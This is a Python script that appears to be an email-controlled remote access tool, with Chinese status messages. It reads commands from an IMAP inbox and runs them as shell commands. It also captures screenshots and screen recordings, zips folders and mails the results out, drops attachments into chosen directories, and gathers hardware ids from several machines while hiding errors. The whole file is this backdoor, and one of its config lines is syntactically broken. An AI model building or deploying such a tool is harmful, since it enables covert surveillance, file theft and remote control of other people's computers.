#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import imaplib
import email
import subprocess
import time
import json
import os
import smtplib
import threading
import socket
from email.header import decode_header
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

class EmailCommander:
    def __init__(self):
        self.config = {
            "target_email": "target_email",
            "sender_emails": ["sender_email"], ["more"]
            "imap_server": "imap.qq.com",
            "email_password": "your-mail-password",
            "smtp_server": "smtp.qq.com",
            "imap_port": 993,
            "smtp_port": 587,
        }
        
        self.processed_emails = set()
        self.load_processed_emails()
        
        socket.setdefaulttimeout(2)
        
        self.imap_pool = []
        self.smtp_pool = []
        self.pool_size = 3
        
        self.init_connection_pools()
    
    def init_connection_pools(self):
        for _ in range(self.pool_size):
            try:
                mail = imaplib.IMAP4_SSL(self.config["imap_server"], self.config["imap_port"])
                mail.login(self.config["target_email"], self.config["email_password"])
                mail.select('inbox')
                self.imap_pool.append(mail)
            except:
                pass
        
        for _ in range(self.pool_size):
            try:
                server = smtplib.SMTP(self.config["smtp_server"], self.config["smtp_port"])
                server.starttls()
                server.login(self.config["target_email"], self.config["email_password"])
                self.smtp_pool.append(server)
            except:
                pass
    
    def get_imap_connection(self):
        if self.imap_pool:
            mail = self.imap_pool.pop()
            try:
                mail.noop()
                return mail
            except:
                try:
                    mail = imaplib.IMAP4_SSL(self.config["imap_server"], self.config["imap_port"])
                    mail.login(self.config["target_email"], self.config["email_password"])
                    mail.select('inbox')
                    return mail
                except:
                    return None
        else:
            try:
                mail = imaplib.IMAP4_SSL(self.config["imap_server"], self.config["imap_port"])
                mail.login(self.config["target_email"], self.config["email_password"])
                mail.select('inbox')
                return mail
            except:
                return None
    
    def return_imap_connection(self, mail):
        if len(self.imap_pool) < self.pool_size:
            self.imap_pool.append(mail)
        else:
            try:
                mail.close()
                mail.logout()
            except:
                pass
    
    def get_smtp_connection(self):
        if self.smtp_pool:
            server = self.smtp_pool.pop()
            try:
                server.noop()
                return server
            except:
                try:
                    server = smtplib.SMTP(self.config["smtp_server"], self.config["smtp_port"])
                    server.starttls()
                    server.login(self.config["target_email"], self.config["email_password"])
                    return server
                except:
                    return None
        else:
            try:
                server = smtplib.SMTP(self.config["smtp_server"], self.config["smtp_port"])
                server.starttls()
                server.login(self.config["target_email"], self.config["email_password"])
                return server
            except:
                return None
    
    def return_smtp_connection(self, server):
        if len(self.smtp_pool) < self.pool_size:
            self.smtp_pool.append(server)
        else:
            try:
                server.quit()
            except:
                pass
    
    def load_processed_emails(self):
        try:
            with open("processed_emails.txt", 'r') as f:
                self.processed_emails = set(f.read().splitlines())
        except:
            pass
    
    def save_processed_emails(self):
        with open("processed_emails.txt", 'w') as f:
            f.write('\n'.join(self.processed_emails))
    
    def decode_header_text(self, text):
        try:
            decoded = decode_header(text)
            result = ""
            for content, encoding in decoded:
                if isinstance(content, bytes):
                    if encoding:
                        result += content.decode(encoding)
                    else:
                        result += content.decode('utf-8', errors='ignore')
                else:
                    result += content
            return result
        except:
            return str(text)
    
    def get_email_body(self, msg):
        body = ""
        if msg.is_multipart():
            for part in msg.walk():
                if part.get_content_type() == "text/plain":
                    try:
                        payload = part.get_payload(decode=True)
                        if payload:
                            body += payload.decode('utf-8', errors='ignore')
                    except:
                        pass
        else:
            try:
                payload = msg.get_payload(decode=True)
                if payload:
                    body = payload.decode('utf-8', errors='ignore')
            except:
                pass
        
        import html
        body = html.unescape(body.strip())
        
        lines = body.split('\n')
        command_lines = []
        for line in lines:
            line = line.strip()
            if line and not line.startswith('发自我的') and not line.startswith('Sent from'):
                command_lines.append(line)
            else:
                break
        
        return '\n'.join(command_lines).strip()
    
    def send_email_result(self, command, result, attachments=None):
        def send_async():
            server = self.get_smtp_connection()
            if not server:
                return
            
            try:
                recipients = self.config["sender_emails"]
                
                for recipient in recipients:
                    try:
                        msg = MIMEMultipart()
                        msg['From'] = self.config["target_email"]
                        msg['To'] = recipient
                        msg['Subject'] = f"结果: {command[:30]}..."
                        
                        body = f"命令: {command}\n\n结果:\n{result}"
                        msg.attach(MIMEText(body, 'plain', 'utf-8'))
                        
                        if attachments:
                            for file_path in attachments:
                                if os.path.exists(file_path):
                                    with open(file_path, "rb") as attachment:
                                        part = MIMEBase('application', 'octet-stream')
                                        part.set_payload(attachment.read())
                                    
                                    encoders.encode_base64(part)
                                    part.add_header(
                                        'Content-Disposition',
                                        f'attachment; filename= {os.path.basename(file_path)}'
                                    )
                                    msg.attach(part)
                        
                        server.send_message(msg)
                        time.sleep(0.1)
                    except:
                        try:
                            server.quit()
                        except:
                            pass
                        server = self.get_smtp_connection()
                        if server:
                            try:
                                server.send_message(msg)
                            except:
                                pass
                
                self.return_smtp_connection(server)
            except:
                try:
                    server.quit()
                except:
                    pass
        
        thread = threading.Thread(target=send_async)
        thread.daemon = True
        thread.start()
    
    def take_screenshot(self):
        try:
            import datetime
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = f"screenshot_{timestamp}.png"
            
            result = subprocess.run([
                'ffmpeg', 
                '-f', 'avfoundation',
                '-i', '1',
                '-vframes', '1',
                '-y',
                screenshot_path
            ], capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0 and os.path.exists(screenshot_path):
                return screenshot_path
            else:
                return None
        except:
            return None

    def record_screen(self, duration):
        try:
            import datetime
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            video_path = f"recording_{timestamp}.mp4"
            
            if duration > 60:
                duration = 60
            elif duration < 1:
                duration = 10
            
            result = subprocess.run([
                'ffmpeg', 
                '-f', 'avfoundation',
                '-i', '1',
                '-t', str(duration),
                '-r', '30',
                '-vcodec', 'libx264',
                '-preset', 'fast',
                '-y',
                video_path
            ], capture_output=True, text=True, timeout=duration + 10)
            
            if result.returncode == 0 and os.path.exists(video_path):
                return video_path
            else:
                return None
        except:
            return None

    def parse_video_duration(self, body):
        try:
            import re
            match = re.search(r'time:(\d+)s', body.lower())
            if match:
                duration = int(match.group(1))
                return min(max(duration, 1), 60)
            else:
                return 10
        except:
            return 10

    def parse_zip_request(self, body):
        try:
            if '|' in body:
                parts = body.strip().split('|')
            else:
                parts = body.strip().split('\n')
            
            cd_command = None
            filename = None
            
            for part in parts:
                part = part.strip()
                if part.startswith('cd '):
                    cd_command = part
                elif part.startswith('name:'):
                    filename = part[5:].strip()
            
            return cd_command, filename
        except:
            return None, None

    def parse_cd_path(self, body):
        try:
            lines = body.strip().split('\n')
            for line in lines:
                line = line.strip()
                if line.startswith('cd '):
                    path = line[3:].strip()
                    return os.path.expanduser(path)
            
            body = body.strip()
            if body.startswith('cd '):
                path = body[3:].strip()
                return os.path.expanduser(path)
            
            return None
        except:
            return None

    def save_attachments(self, msg, target_dir):
        saved_files = []
        try:
            if not os.path.exists(target_dir):
                return []
            
            if not os.path.isdir(target_dir):
                return []
            
            for part in msg.walk():
                content_disposition = part.get('Content-Disposition', '')
                filename = part.get_filename()
                
                is_attachment = (
                    'attachment' in content_disposition.lower() or
                    filename is not None or
                    (part.get_content_maintype() != 'text' and 
                     part.get_content_maintype() != 'multipart' and
                     part.get_payload(decode=True) is not None)
                )
                
                if is_attachment and filename:
                    filename = self.decode_header_text(filename)
                    filepath = os.path.join(target_dir, filename)
                    
                    if os.path.exists(filepath):
                        import datetime
                        timestamp = datetime.datetime.now().strftime("_%Y%m%d_%H%M%S")
                        name, ext = os.path.splitext(filename)
                        filename = f"{name}{timestamp}{ext}"
                        filepath = os.path.join(target_dir, filename)
                    
                    payload = part.get_payload(decode=True)
                    if payload:
                        with open(filepath, 'wb') as f:
                            f.write(payload)
                        saved_files.append(filepath)
            
            return saved_files
        except:
            return []

    def create_zip_file(self, cd_command, filename):
        try:
            import zipfile
            import datetime
            
            original_dir = os.getcwd()
            
            if cd_command:
                path = cd_command[3:].strip()
                path = os.path.expanduser(path)
                if os.path.exists(path):
                    os.chdir(path)
                else:
                    return None, f"目录不存在: {path}"
            
            if not os.path.exists(filename):
                os.chdir(original_dir)
                return None, f"文件或文件夹不存在: {filename}"
            
            if os.path.isdir(filename):
                total_size = sum(os.path.getsize(os.path.join(dirpath, filename))
                               for dirpath, dirnames, filenames in os.walk(filename)
                               for filename in filenames)
                
                if total_size > 100 * 1024 * 1024:
                    os.chdir(original_dir)
                    return None, f"文件夹太大 ({total_size} bytes)，请选择较小的文件夹"
            
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            zip_filename = f"{filename}_{timestamp}.zip"
            zip_path = os.path.join(original_dir, zip_filename)
            
            file_count = 0
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                if os.path.isfile(filename):
                    zipf.write(filename, os.path.basename(filename))
                    file_count = 1
                elif os.path.isdir(filename):
                    for root, dirs, files in os.walk(filename):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_path, os.path.dirname(filename))
                            zipf.write(file_path, arcname)
                            file_count += 1
            
            os.chdir(original_dir)
            
            if os.path.exists(zip_path):
                file_size = os.path.getsize(zip_path)
                return zip_path, f"压缩完成: {filename} -> {zip_filename} ({file_size} bytes, {file_count} 个文件)"
            else:
                return None, "压缩文件创建失败"
                
        except Exception as e:
            try:
                os.chdir(original_dir)
            except:
                pass
            return None, f"压缩失败: {e}"

    def detect_output_files(self, command, output):
        if command.strip().startswith('curl'):
            return []
        
        file_commands = ['>', '>>', 'tee', 'wget', 'git clone', 'cp', 'mv']
        
        for cmd in file_commands:
            if cmd in command:
                if '>' in command:
                    parts = command.split('>')
                    if len(parts) > 1:
                        filename = parts[-1].strip().split()[0]
                        if os.path.exists(filename) and os.path.isfile(filename):
                            return [filename]
        
        return []

    def execute_command(self, command):
        try:
            if any(op in command for op in ['&&', '||', ';']):
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    cwd=os.getcwd()
                )
                
                if 'cd ' in command:
                    pwd_result = subprocess.run(
                        'pwd',
                        shell=True,
                        capture_output=True,
                        text=True,
                        cwd=os.getcwd()
                    )
                    if pwd_result.returncode == 0:
                        try:
                            new_dir = pwd_result.stdout.strip()
                            if os.path.exists(new_dir):
                                os.chdir(new_dir)
                        except:
                            pass
                
                output = ""
                if result.stdout:
                    output += result.stdout
                if result.stderr:
                    output += result.stderr
                
                if not output.strip():
                    output = f"[命令执行完成，返回码: {result.returncode}]"
                
                attachments = self.detect_output_files(command, output)
                self.send_email_result(command, output.rstrip(), attachments)
                
                return output.rstrip()
            
            elif command.strip().startswith('cd ') and not any(op in command for op in ['&&', '||', ';']):
                try:
                    path = command.strip()[3:].strip()
                    if not path:
                        path = os.path.expanduser('~')
                    else:
                        path = os.path.expanduser(path)
                    
                    os.chdir(path)
                    new_dir = os.getcwd()
                    
                    self.send_email_result(command, new_dir)
                    
                    return f"{new_dir}"
                    
                except Exception as e:
                    error_msg = f"cd: {e}"
                    self.send_email_result(command, error_msg)
                    return error_msg
            
            else:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    cwd=os.getcwd()
                )
                
                output = ""
                if result.stdout:
                    output += result.stdout
                if result.stderr:
                    output += result.stderr
                
                if not output.strip():
                    output = f"[命令执行完成，返回码: {result.returncode}]"
                
                attachments = self.detect_output_files(command, output)
                self.send_email_result(command, output.rstrip(), attachments)
                
                return output.rstrip()
            
        except subprocess.TimeoutExpired:
            error = "命令执行超时"
            self.send_email_result(command, error)
            return error
        except Exception as e:
            error = f"执行失败: {e}"
            self.send_email_result(command, error)
            return error
    
    def get_machine_info(self):
        try:
            import platform
            import uuid
            
            machine_name = platform.node()
            mac = uuid.getnode()
            hwid = f"{mac:012x}"
            
            return machine_name, hwid
        except:
            return "unknown", "unknown"
    
    def send_hwid_response(self, request_number, requester_name):
        def send_async():
            server = self.get_smtp_connection()
            if not server:
                return
            
            try:
                machine_name, hwid = self.get_machine_info()
                response_body = f"name:{machine_name} hwid:{hwid} request by:{requester_name} #{request_number}"
                
                msg = MIMEMultipart()
                msg['From'] = self.config["target_email"]
                msg['To'] = self.config["target_email"]
                msg['Subject'] = "#hwidresp#"
                
                msg.attach(MIMEText(response_body, 'plain', 'utf-8'))
                server.send_message(msg)
                
                self.return_smtp_connection(server)
            except:
                try:
                    server.quit()
                except:
                    pass
        
        thread = threading.Thread(target=send_async)
        thread.daemon = True
        thread.start()
    
    def send_hwid_request(self):
        def send_async():
            server = self.get_smtp_connection()
            if not server:
                return
            
            try:
                import datetime
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                
                msg = MIMEMultipart()
                msg['From'] = self.config["target_email"]
                msg['To'] = self.config["target_email"]
                msg['Subject'] = "#hwid#"
                
                request_id = timestamp[-6:]
                body = f"HWID检测请求 #{request_id}"
                msg.attach(MIMEText(body, 'plain', 'utf-8'))
                
                server.send_message(msg)
                self.return_smtp_connection(server)
            except:
                try:
                    server.quit()
                except:
                    pass
        
        thread = threading.Thread(target=send_async)
        thread.daemon = True
        thread.start()
    
    def handle_terminal_input(self):
        while True:
            try:
                user_input = input().strip().lower()
                if user_input == "hwid":
                    self.send_hwid_request()
            except:
                break
    
    def check_new_emails(self):
        mail = self.get_imap_connection()
        if not mail:
            return
        
        try:
            status, messages = mail.search(None, 'UNSEEN')
            
            if status == 'OK' and messages[0]:
                email_ids = messages[0].split()
                
                for email_id in email_ids:
                    try:
                        status, data = mail.fetch(email_id, '(RFC822)')
                        if status != 'OK':
                            continue
                        
                        if data and isinstance(data[0], tuple) and len(data[0]) > 1:
                            msg = email.message_from_bytes(data[0][1])
                            
                            subject = self.decode_header_text(msg.get('Subject', ''))
                            sender = self.decode_header_text(msg.get('From', ''))
                            body = self.get_email_body(msg)
                            
                            import re
                            email_match = re.search(r'<(.+?)>', sender)
                            sender_email = email_match.group(1) if email_match else sender.strip()
                            
                            is_authorized = sender_email.lower() in [email.lower() for email in self.config["sender_emails"]]
                            
                            if subject.startswith("#cmd#") and is_authorized:
                                if body.strip():
                                    def exec_async():
                                        self.execute_command(body)
                                    thread = threading.Thread(target=exec_async)
                                    thread.daemon = True
                                    thread.start()
                                else:
                                    self.send_email_result("空命令", "错误: 邮件正文为空，无法执行命令")
                            
                            elif subject.startswith("#ff#") and is_authorized:
                                screenshot_path = self.take_screenshot()
                                if screenshot_path:
                                    self.send_email_result("截屏", "屏幕截图已生成", [screenshot_path])
                                    try:
                                        os.remove(screenshot_path)
                                    except:
                                        pass
                                else:
                                    self.send_email_result("截屏", "错误: 截屏失败，请检查ffmpeg是否安装")
                            
                            elif subject.startswith("#ffvideo#") and is_authorized:
                                duration = self.parse_video_duration(body)
                                video_path = self.record_screen(duration)
                                if video_path:
                                    self.send_email_result("录屏", f"屏幕录制完成 ({duration}秒)", [video_path])
                                    try:
                                        os.remove(video_path)
                                    except:
                                        pass
                                else:
                                    self.send_email_result("录屏", "错误: 录屏失败，请检查ffmpeg是否安装")
                            
                            elif subject.startswith("#zip#") and is_authorized:
                                cd_command, filename = self.parse_zip_request(body)
                                
                                if filename:
                                    self.send_email_result("压缩开始", f"开始压缩文件: {filename}")
                                    
                                    zip_path, result_msg = self.create_zip_file(cd_command, filename)
                                    
                                    if zip_path:
                                        self.send_email_result("压缩文件", result_msg, [zip_path])
                                        try:
                                            os.remove(zip_path)
                                        except:
                                            pass
                                    else:
                                        self.send_email_result("压缩文件", f"错误: {result_msg}")
                                else:
                                    self.send_email_result("压缩文件", "错误: 请指定文件名，格式：cd path|name:filename")
                            
                            elif subject.startswith("#opn#") and is_authorized:
                                target_dir = self.parse_cd_path(body)
                                
                                if target_dir:
                                    if not os.path.exists(target_dir):
                                        self.send_email_result("附件下载", f"错误: 目录不存在: {target_dir}")
                                    elif not os.path.isdir(target_dir):
                                        self.send_email_result("附件下载", f"错误: 路径不是目录: {target_dir}")
                                    else:
                                        saved_files = self.save_attachments(msg, target_dir)
                                        
                                        if saved_files:
                                            file_list = '\n'.join([os.path.basename(f) for f in saved_files])
                                            self.send_email_result("附件下载", f"附件已保存到: {target_dir}\n\n保存的文件:\n{file_list}")
                                        else:
                                            self.send_email_result("附件下载", f"错误: 没有找到附件或保存失败\n目标目录: {target_dir}")
                                else:
                                    self.send_email_result("附件下载", f"错误: 请指定有效的目录路径，格式：cd ~/downloads/test\n\n邮件正文内容:\n{body}")
                            
                            elif subject.startswith("#hwid#") and sender_email.lower() == self.config["target_email"].lower():
                                import re
                                match = re.search(r'#(\d+)', body)
                                request_number = int(match.group(1)) if match else 1
                                
                                self.send_hwid_response(request_number, "caoyuantai")
                                
                                def collect_async():
                                    time.sleep(3)
                                    self.collect_hwid_responses()
                                thread = threading.Thread(target=collect_async)
                                thread.daemon = True
                                thread.start()
                        
                        mail.store(email_id, '+FLAGS', '\\Seen')
                        
                    except:
                        try:
                            mail.store(email_id, '+FLAGS', '\\Seen')
                        except:
                            pass
            
            self.return_imap_connection(mail)
        except:
            try:
                mail.close()
                mail.logout()
            except:
                pass
    
    def collect_hwid_responses(self):
        mail = self.get_imap_connection()
        if not mail:
            return
        
        try:
            status, messages = mail.search(None, 'SUBJECT', '#hwidresp#')
            
            responses = []
            if status == 'OK' and messages[0]:
                email_ids = messages[0].split()
                
                for email_id in email_ids:
                    try:
                        status, data = mail.fetch(email_id, '(RFC822)')
                        if status == 'OK' and data and isinstance(data[0], tuple):
                            msg = email.message_from_bytes(data[0][1])
                            body = self.get_email_body(msg)
                            
                            if body.strip():
                                responses.append(body.strip())
                        
                        mail.store(email_id, '+FLAGS', '\\Deleted')
                    except:
                        continue
            
            mail.expunge()
            self.return_imap_connection(mail)
            
            if responses:
                summary = "HWID检测结果:\n\n"
                for i, response in enumerate(responses, 1):
                    summary += f"{i}. {response}\n"
                summary += f"\n总计: {len(responses)} 台设备"
                self.send_email_result("HWID检测", summary)
            else:
                self.send_email_result("HWID检测", "没有收到响应")
                
        except:
            try:
                mail.close()
                mail.logout()
            except:
                pass

    def run(self):
        if not self.config["email_password"]:
            return
        
        input_thread = threading.Thread(target=self.handle_terminal_input)
        input_thread.daemon = True
        input_thread.start()
        
        while True:
            try:
                self.check_new_emails()
            except:
                pass
            
            time.sleep(0.05)

if __name__ == "__main__":
    commander = EmailCommander()
    commander.run()
